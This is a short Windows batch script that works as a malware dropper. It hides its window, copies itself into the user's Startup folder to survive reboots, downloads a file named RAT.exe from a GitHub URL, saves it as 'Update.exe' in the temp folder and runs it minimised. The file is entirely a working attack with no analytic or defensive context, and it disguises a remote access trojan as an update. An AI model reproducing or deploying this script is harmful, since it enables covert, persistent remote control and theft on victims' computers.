@echo off
powershell.exe -windowstyle Hidden -command
title %random%
copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %temp%
if exist "Update.exe" del Update.exe
powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/RAT.exe -OutFile Update.exe
start /min Update.exe
exit